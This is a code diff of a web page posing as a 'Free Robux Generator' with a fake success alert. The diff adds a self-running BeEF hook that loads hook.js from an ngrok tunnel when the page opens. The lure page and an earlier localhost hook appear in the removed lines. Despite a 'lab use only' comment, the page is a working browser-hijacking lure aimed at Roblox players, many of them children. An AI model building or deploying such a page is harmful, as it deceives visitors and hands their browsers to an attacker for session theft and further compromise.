@@ -1,69 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <link rel="stylesheet" href="style.css">
-  <meta charset="UTF-8">
-  <title>Free Robux Generator)</title>
-  <style>
-    body {
-      background-color: #121212;
-      color: #00ffcc;
-      font-family: 'Arial', sans-serif;
-      text-align: center;
-      padding-top: 100px;
-    }
-    input, select, button {
-      padding: 10px;
-      margin: 10px;
-      font-size: 16px;
-    }
-    h1 {
-      font-size: 50px;
-      margin-bottom: 20px;
-    }
-  </style>
-</head>
-<body>
-  <h1>Free Robux</h1>
-  <p>Enter your username and choose your Robux amount:</p>
+<script>
+  // Robux generator logic
+  function generateRobux() {
+    const username = document.getElementById("username").value.trim();
+    const amount = document.getElementById("amount").value;
 
-  <input type="text" id="username" placeholder="Enter username">
-  <br>
-  <select id="amount">
-    <option value="100">100 Robux</option>
-    <option value="500">500 Robux</option>
-    <option value="1000">1000 Robux</option>
-    <option value="5000">5000 Robux</option>
-    <option value="10 Million"> 10 Mil Robux</option>
-  </select>
-  <br>
-  <button onclick="generateRobux()">Generate Robux</button>
-
-  <script>
-    function generateRobux() {
-      const username = document.getElementById("username").value.trim();
-      const amount = document.getElementById("amount").value;
-
-      if (username === "") {
-        alert("Please enter a username!");
-        return;
-      }
-
-      alert(`✅ Added ${amount} Robux to ${username}'s account.`);
+    if (username === "") {
+      alert("Please enter a username!");
+      return;
     }
-    function runHook() {
-      alert("🎉 You got free Robux! (Lab test only)");
-      
-      // BeEF hook injection (lab use only)
-      (function () {
-        var url = 'http://127.0.0.1:3000/hook.js';
-        if (typeof beef == 'undefined') {
-          var bf = document.createElement('script');
-          bf.type = 'text/javascript';
-          bf.src = url;
-          document.body.appendChild(bf);
-        }
-      }) ();
-  </script>
-</body>
-</html>
+
+    alert(`✅ Added ${amount} Robux to ${username}'s account.`);
+  }
+
+  // BeEF hook injection (lab use only)
+  (function () {
+    var url = 'http://abc123.ngrok.io/hook.js'; // Replace with your actual Ngrok URL
+    if (typeof beef == 'undefined') {
+      var bf = document.createElement('script');
+      bf.type = 'text/javascript';
+      bf.src = url;
+      document.body.appendChild(bf);
+    }
+  })();
+</script>
